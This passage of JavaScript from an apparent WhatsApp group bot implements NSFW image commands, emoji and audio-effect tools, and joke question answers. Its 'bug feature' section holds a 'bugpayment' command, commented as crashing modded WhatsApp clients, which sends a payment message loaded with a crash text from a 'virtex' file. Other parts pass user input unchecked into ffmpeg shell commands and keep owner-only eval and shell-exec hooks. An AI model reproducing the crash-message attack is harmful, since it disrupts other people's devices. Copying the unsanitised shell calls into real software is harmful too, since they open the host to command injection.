	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/panties.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'pussy':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/pussy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'tentacles':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/tentacles.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'thights':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/thights.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'yuri':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/yuri.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'zettai':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/zettai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'gifblowjob':
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await Kyuu.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'gifhentai':
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gifs.json'))
var xeonyresultx = pickRandom(ahegaonsfw)
    await Kyuu.sendMessage(m.chat,{video:xeonyresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
    case 'gifs': case 'foot': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
let heyy
    let yeha = heyy[Math.floor(Math.random() * heyy.length)];
    if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gifs.json')
    if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/foot.json')
Kyuu.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
    case 'igemoji': 
case 'instagramemoji': 
if (!q) return replygcxeon("Enter emoji, maximum 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcxeon(mess.wait)
emote(q, "11")
break
case 'iphoneemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcxeon(mess.wait)
emote(q, "0")
break
case 'googleemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcxeon(mess.wait)
emote(q, "1")
break
case 'samsungemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcxeon(mess.wait)
emote(q, "2")
break
case 'microsoftemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcxeon(mess.wait)
emote(q, "3")
break
case 'whatsappemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcxeon(mess.wait)
emote(q, "4")
break
case 'twitteremoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcxeon(mess.wait)
emote(q, "5")
break
case 'facebookemoji': 
case 'fbemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcxeon(mess.wait)
emote(q, "6")
break
case 'skypeemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcxeon(mess.wait)
emote(q, "7")
break
case 'joyemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcxeon(mess.wait)
emote(q, "8")
break
case 'mojiemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcxeon(mess.wait)
emote(q, "9")
case 'pediaemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcxeon(mess.wait)
emote(q, "10")
break
case 'emoji': {
if (!args.join(" ")) return replygcxeon('Where is the emoji?')
emoji.get(args.join(" ")).then(async(emoji) => {
let mese = await Kyuu.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Made by ${global.botname}`}, {quoted:m})
await Kyuu.sendMessage(from, {text:"reply #s to this image to make sticker"}, {quoted:mese})
})
}
break
case 'volume': {
if (!args.join(" ")) return replygcxeon(`Example: ${prefix + command} 10`)
media = await Kyuu.downloadAndSaveMediaMessage(quoted, "volume")
if (isQuotedAudio) {
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcxeon('Error!')
jadie = fs.readFileSync(rname)
Kyuu.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
} else if (isQuotedVideo) {
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply('Error!')
jadie = fs.readFileSync(rname)
Kyuu.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
} else {
replygcxeon("Send video/audio")
}
}
break
 case 'tinyurl':{
   if(!q) return replygcxeon('link?')
   const request = require('request')
   request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
   try {
  replygcxeon(body)
  } catch (e) {
  m.reply(e)
  }
  })
  }
 break
case 'git': case 'gitclone':
if (!args[0]) return replygcxeon(`Where is the link?\nExample :\n${prefix}${command} https://github.com/DGXeon/XeonMedia`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcxeon(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    Kyuu.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replygcxeon(mess.error))
break
case 'spotify':
if (!text) return replygcxeon(`Where is the link?`)
        const Spotify = require('./lib/spotify')
        const spotify = new Spotify(text)
        const info = await spotify.getInfo()
        if ((info).error) return replygcxeon(`The link you provided is not spotify link`)
        const { name, artists, album_name, release_date, cover_url } = info
        const details = `${themeemoji} *Title:* ${name || ''}\n${themeemoji} *Artists:* ${(artists || []).join(
            ','
        )}\n${themeemoji} *Album:* ${album_name}\n${themeemoji} *Release Date:* ${release_date || ''}`
       const response = await Kyuu.sendMessage(m.chat, { image: { url: cover_url }, caption: details }, { quoted: m })
        const bufferpotify = await spotify.download()
        await Kyuu.sendMessage(m.chat, { audio: bufferpotify }, { quoted: response })
break
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                replygcxeon(mess.wait)
                let media = await Kyuu.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                Kyuu.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else replygcxeon(`Reply to the audio you want to change with a caption *${prefix + command}*`)
                } catch (e) {
                replygcxeon(e)
                }
                break
                case 'define': 
if (!q) return replygcxeon(`What do you want to define?`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return replygcxeon(mess.error)
const reply = `
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
   Kyuu.sendMessage(m.chat,{text:reply},{quoted:m})
} catch (err) {
    console.log(err)
    return replygcxeon(`*${q}* isn't a valid text`)
    }
    break
                case 'can': {
            	if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} i dance?`)
            	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                let jawab = `*Can ${text}*\nAnswer : ${keh}`
            await replygcxeon(jawab)
            }
            break
            case 'is': {
            	if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} she virgin?`)
            	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*Is ${text}*\nAnswer : ${kah}`                
            await replygcxeon(jawab)
            }
            break
            case 'when': {
            	if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} will i get married?`)
            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `*${command} ${text}*\nAnswer : ${koh}`                
            await replygcxeon(jawab)
            }
            break
case 'what': {
            	if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
                let kah = lel[Math.floor(Math.random() * lel.length)]
                let jawab = `*What ${text}*\nAnswer : ${kah}`                
            await replygcxeon(jawab)
            }
            break
case 'where': {
if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
                let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
                let jawab = `*Whwre ${text}*\nAnswer : ${kah}`              
            await replygcxeon(jawab)
            }
            break
case 'how': {
            	if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} to date girl?`)
            	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
                let kah = gimana[Math.floor(Math.random() * gimana.length)]
                let jawab = `*How ${text}*\nAnswer : ${kah}`                
            await replygcxeon(jawab)
            }
            break
case 'rate': {
            	if (!text) return replygcxeon(`Example : ${prefix + command} my profile`)
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                let kah = ra[Math.floor(Math.random() * ra.length)]
                let jawab = `*Rate ${text}*\nAnswer : ${kah}%`                
            await replygcxeon(jawab)
            }
            break
            case 'runtime': {
            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
                replygcxeon(lowq)
            	}
            break
            case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
Kyuu.sendMessage(m.chat, { text: xeonkak }, { quoted: m })
break
            case 'soulmate': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
Kyuu.sendMessage(m.chat,
{ text: `👫Your Soulmate Is

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
 case 'jadian': {
            if (!m.isGroup) return replygcxeon(mess.group)
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
Kyuu.sendMessage(m.chat,
{ text: `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
Cieeee, What's Going On❤️💖👀`,
contextInfo:{
mentionedJid:[orang, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
                        case 'coffee': case 'kopi': {
                Kyuu.sendMessage(m.chat, {caption: mess.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
            }
            break
            case 'wallpaper': {
                if (!text) return replygcxeon('Enter Query Title')
                replygcxeon(mess.wait)
		let { wallpaper } = require('./lib/scraper')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]                
                Kyuu.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: m })
            }
            break
            case 'wikimedia': {
                if (!text) return replygcxeon('Enter Query Title')
                replygcxeon(mess.wait)
		let { wikimedia } = require('./lib/scraper')
                let anumedia = await wikimedia(text)
                result = anumedia[Math.floor(Math.random() * anumedia.length)]
                Kyuu.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`, image: { url: result.image }} , { quoted: m })
            }
            break
	//bug feature
case 'bugpayment' : { //crashes mod whatsapps
if (!isOwner) return replygcxeon(mess.owner)
if (!text) return replygcxeon(`Example : ${prefix + command} xeon bihari😂`)
const { xeonorwot } = require('./kbug/virtex/ios2.js')
let teks = `${text}`
{
Kyuu.relayMessage(from, { 
requestPaymentMessage: { 
Message: { extendedTextMessage: { 
text: `${xeonorwot}`, 
currencyCodeIso4217: 'INR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
contextInfo:{
"externalAdReply": {
"title": `PAPA XEON`,
"body": ` ${xeonytimewisher} my friend ${pushname}`,
mimetype: 'audio/mpeg', 
caption: `🔥 ${teks} ${buttonkal}`,
showAdAttribution: true,
sourceUrl: wagc,
thumbnailUrl: thumb, 
}
}}}}}, { quoted:m})
}
}
break
case 'bugreact':{
if (!isOwner) return replygcxeon(mess.owner)
let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" })
Kyuu.relayMessage(m.chat, { reactionMessage }, { messageId: '🦄' })
}
break

default:
if (budy.startsWith('<')) {
if (!isOwner) return
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}

if (budy.startsWith('vv')) {
if (!isOwner) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}

if (budy.startsWith('uu')){
if (!isOwner) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) {
m.reply(stdout)
}
})
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
if (room) {
let other = room.other(sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
}

if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
Kyuu.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}

} catch (err) {
console.log(util.format(err))
let e = String(err)
}
}

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})